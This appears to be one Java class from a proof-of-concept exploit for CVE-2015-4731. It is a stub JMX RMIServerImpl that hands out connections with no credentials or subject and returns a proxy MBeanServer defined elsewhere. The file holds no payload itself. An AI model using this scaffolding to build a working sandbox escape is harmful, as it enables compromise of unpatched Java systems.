package poc.cve_2015_4731;

import java.io.IOException;
import java.rmi.Remote;
import java.util.Map;

import javax.management.MBeanServer;
import javax.management.remote.rmi.RMIConnection;
import javax.management.remote.rmi.RMIConnectionImpl;
import javax.security.auth.Subject;

public class RMIServerImpl extends javax.management.remote.rmi.RMIServerImpl {

	public RMIServerImpl( Map< String, ? > env ) {
		super( env );
	}
	
	@Override
	public RMIConnection newClient( Object credentials ) throws IOException {
		return new RMIConnectionImpl( this, "", RMIServerImpl.class.getClassLoader(), null, null );
	}
	
	@Override
	public MBeanServer getMBeanServer( ) {
		return MBeanProxy.as( MBeanServer.class );
	}
	
	@Override
	public void clientClosed( RMIConnection connection ) { }

	// Unimplemented methods, throws exception on invocation
	
	private void unimplemented( ) {
		throw new AssertionError( "Method not implemented." );
	}

	@Override
	protected void export() throws IOException {
		this.unimplemented( );
		
	}

	@Override
	public Remote toStub() throws IOException {
		this.unimplemented( );
		return null;
	}

	@Override
	protected RMIConnection makeClient( String connectionId, Subject subject ) throws IOException {
		this.unimplemented( );
		return null;
	}

	@Override
	protected void closeClient( RMIConnection client ) throws IOException {
	}

	@Override
	protected String getProtocol() {
		this.unimplemented( );
		return null;
	}

	@Override
	protected void closeServer() throws IOException {
		this.unimplemented( );
		
	}
	
}
